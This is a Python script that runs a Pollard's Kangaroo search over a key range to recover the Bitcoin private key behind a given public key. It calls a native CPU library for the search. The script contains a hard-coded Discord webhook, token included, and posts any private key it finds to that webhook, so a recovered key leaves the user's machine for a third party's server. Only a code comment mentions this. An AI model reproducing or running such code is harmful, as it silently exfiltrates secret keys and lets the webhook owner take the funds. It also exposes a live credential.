# -*- coding: utf-8 -*-

import bit
import ctypes
import platform
import sys
import os
import random
import argparse
import signal
import requests  # Add this import for sending messages to Discord

###############################################################################
parser = argparse.ArgumentParser(description='This tool use Kangaroo algo for searching 1 pubkey in the given range using multiple cpu', 
                                 epilog='Enjoy the program! :) ')
parser.version = '15112021'
parser.add_argument("-p", "--pubkey", help = "Public Key in hex format (compressed or uncompressed)", required=True)
parser.add_argument("-keyspace", help = "Keyspace Range ( hex ) to search from min:max. default=1:order of curve", action='store')
parser.add_argument("-ncore", help = "Number of CPU to use. default = Total-1", action='store')
parser.add_argument("-n", help = "Total range search in 1 loop. default=72057594037927935", action='store')
parser.add_argument("-rand", help = "Start from a random value in the given range from min:max and search 0XFFFFFFFFFFFFFF values then again take a new random", action="store_true")
parser.add_argument("-rand1", help = "First Start from a random value, then go fully sequential, in the given range from min:max", action="store_true")

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)
args = parser.parse_args()

###############################################################################
ss = args.keyspace if args.keyspace else '1:FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364140'
flag_random = True if args.rand else False
flag_random1 = True if args.rand1 else False
ncore = int(args.ncore) if args.ncore else os.cpu_count() - 1
increment = int(args.n) if args.n else 72057594037927935
public_key = args.pubkey    
if flag_random1: flag_random = True

a, b = ss.split(':')
a = int(a, 16)
b = int(b, 16)
lastitem = 0

###############################################################################
if platform.system().lower().startswith('win'):
    pathdll = os.path.realpath('Kangaroo_CPU.dll')
    ice = ctypes.CDLL(pathdll)
    
elif platform.system().lower().startswith('lin'):
    pathdll = os.path.realpath('Kangaroo_CPU.so')
    ice = ctypes.CDLL(pathdll)
    
else:
    print('[-] Unsupported Platform currently for ctypes dll method. Only [Windows and Linux] is working')
    sys.exit()
    
ice.run_cpu_kangaroo.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_char_p, ctypes.c_char_p] # st,en,dp,ncpu,mx,pvk,upub
ice.init_kangaroo_lib()

###############################################################################
def run_cpu_kangaroo(start_range_int, end_range_int, dp, ncpu, mx, upub_bytes):
    st_hex = hex(start_range_int)[2:].encode('utf8')
    en_hex = hex(end_range_int)[2:].encode('utf8')
    res = (b'\x00') * 32
    ice.run_cpu_kangaroo(st_hex, en_hex, dp, ncpu, mx, res, upub_bytes)
    return res

def pub2upub(pub_hex):
    x = int(pub_hex[2:66], 16)
    if len(pub_hex) < 70:
        y = bit.format.x_to_y(x, int(pub_hex[:2], 16) % 2)
    else:
        y = int(pub_hex[66:], 16)
    return bytes.fromhex('04' + hex(x)[2:].zfill(64) + hex(y)[2:].zfill(64))

def randk(a, b):
    global lastitem
    if flag_random:
        random.seed(random.randint(1, 2**256))
        return random.SystemRandom().randint(a, b)
    else:
        if lastitem == 0:
            return a
        elif lastitem > b:
            print('[+] Range Finished')
            exit()
        else:
            return lastitem + 1

def handler(signal_received, frame):
    # Handle any cleanup here
    print('\nSIGINT or CTRL-C detected. Exiting gracefully. BYE')
    exit(0)

###############################################################################
print('[+] Starting CPU Kangaroo.... Please Wait     Version [', parser.version, ']')

# Send a starting message to the Discord webhook
webhook_url = 'https://discord.com/api/webhooks/1227963383014232154/VF4b19q5P3-Cn2JLqpIH_GO_SGzQlYki_cuOtx_ui0n7BwguZ4jQRIYGoFU2B1u41QKg'
start_message = {
    "content": "[+] CPU Kangaroo is starting... Please wait."
}
requests.post(webhook_url, json=start_message)

dp = 10  # -1 for automatic value
mx = 2  # 0 for Endless

upub = pub2upub(public_key)

###############################################################################
if flag_random1:
    print('[+] Search Mode: Random Start then Continuous Range Search from it')
elif flag_random:
    print('[+] Search Mode: Random Start after every Range 0XFFFFFFFFFFFFFF key search')
else:
    print('[+] Search Mode: Range search Continuous in the given range')
###############################################################################
range_st = randk(a, b)  # start from
range_en = range_st + increment

# Reset the flag after getting 1st Random Start Key
if flag_random1:
    flag_random = False

print('[+] Working on Pubkey:', upub.hex())
print('[+] Using  [Number of CPU Threads: {}] [DP size: {}] [MaxStep: {}]'.format(ncore, dp, mx))
###############################################################################
print('[+] ............................................', end='\r')

# Set up the signal handler to catch SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, handler)

while True:
    print('\r[+] Scanning Range          ', hex(range_st), ':', hex(range_en))
    pvk_found = run_cpu_kangaroo(range_st, range_en, dp, ncore, mx, upub)
    if int(pvk_found.hex(), 16) != 0:
        print('\n============== KEYFOUND ==============')
        print('Kangaroo FOUND PrivateKey : 0x' + pvk_found.hex())
        print('======================================')
        with open('KEYFOUNDKEYFOUND.txt', 'a') as fw:
            fw.write('Kangaroo FOUND PrivateKey : 0x' + pvk_found.hex() + '\n')

        # Send a key found message to the Discord webhook
        key_found_message = {
            "content": f"Kangaroo FOUND PrivateKey : 0x{pvk_found.hex()}"
        }
        requests.post(webhook_url, json=key_found_message)
        
        break
    lastitem = range_en
    range_st = randk(a, b)
    range_en = range_st + increment
    print('', end='\r')
print('[+] Program Finished')
